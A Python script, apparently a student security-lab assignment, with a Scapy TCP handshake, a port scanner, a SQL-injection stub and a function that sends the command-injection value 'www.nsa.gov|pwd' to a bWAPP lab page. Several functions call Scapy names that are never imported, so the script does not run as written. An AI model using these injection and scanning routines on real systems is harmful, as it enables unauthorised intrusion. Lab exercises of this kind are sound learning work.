# !/usr/bin/env python3
# Andrew Quijano
# UNI: afq2101
from __future__ import print_function
from os import popen
import urllib.request
import urllib.error
import requests
counter = 0


# TODO: Figure out how to get default subnet mask?
def get_network_address(ip_address, mask="/24"):
    ip = ip_address.split('.')
    ip[3] = '0'
    return '.'.join(ip) + mask


# Remember for this to work you must disable Kernel from resetting TCP!
# For now, just do a generic TCP Handshake with a regular server!
def tcp_handshake(destination_ip, http_path, src_ip="192.168.118.129", destination_port=80):
    http_message = \
        "GET " + http_path + " HTTP/1.1\r\n" \
        "Host:"+destination_ip+"\r\n" \
        "Accept-Encoding: gzip, deflate\r\n\r\n"
    ip_packet = IP(src=src_ip, dst=destination_ip)

    src_port = random.randint(1025, 65535)
    # SEND SYN
    syn = ip_packet / TCP(sport=src_port, dport=destination_port, flags='S')

    # Get SYN_ACK
    syn_ack = sr1(syn)

    # Send SYN_ACK
    out_ack = ip_packet / TCP(dport=destination_port,
                              sport=syn_ack[TCP].dport,
                              seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A')
    send(out_ack)

    # Send the HTTP GET with ACK
    get_request = ip_packet / TCP(dport=destination_port,
                                  sport=syn_ack[TCP].dport,
                                  seq=syn_ack[TCP].ack,
                                  ack=syn_ack[TCP].seq + 1, flags='A') / Raw(load=http_message)

    # Start a loop to keep using get until content length is 0! Call Connection Close as well
    get_request.show()
    # reply = sr1(get_request, multi=True)
    # for r in reply:
    # r[1].show()
    # text = r[1].getlayer(Raw)
    # print(text)
    # if text is not None:
    # print(text.decode())

    # NEED TO ADD CLOSING TCP!
    # FIN = ip_packet/TCP(sport=src_port, dport=destination_port, flags="FA",
    #                    seq=syn_ack.ack, ack=syn_ack.seq + 1)
    # FINACK = sr1(FIN)
    # LASTACK = ip_packet/TCP(sport=src_port, dport=destination_port,
    #                         flags="A", seq=FINACK.ack, ack=FINACK.seq + 1)
    # send(LASTACK)


def get(destination_ip, http_path):
    try:
        contents = urllib.request.urlopen("http://"+destination_ip+http_path)
        reply = contents.read().decode('utf-8')
        return reply

    except urllib.error.HTTPError:
        # Return code error (e.g. 404, 501, ...)
        # print('HTTPError: {}'.format(e.code))
        return None
    except urllib.error.URLError:
        # Not an HTTP-specific error (e.g. connection refused)
        # print('URLError: {}'.format(e.reason))
        return None


# Scan which ports are open!
def port_scanner(src_ip="127.0.0.1", target_ip="127.0.0.1", src_port=1024, destination_port=65535):
    current_port = src_port
    while current_port != destination_port:
        port_scanning_packet = IP(src=src_ip, dst=target_ip)/TCP(sport=src_port, dport=current_port)
        port_scanning_packet.show()
        send(port_scanning_packet)
        current_port = current_port + 1


# Option 3 - SQL Inject
def sql_inject(host, target_path, sql_attacks="sql_attack.txt"):
    with open(sql_attacks) as fd:
        for line in fd:
            print(line)


def os(url="http://192.168.118.130/bWAPP/commandi.php", command="www.nsa.gov|pwd"):
    r = requests.post(url=url, data=command)
    with open("out.txt", "w") as f:
        f.write(r.text)
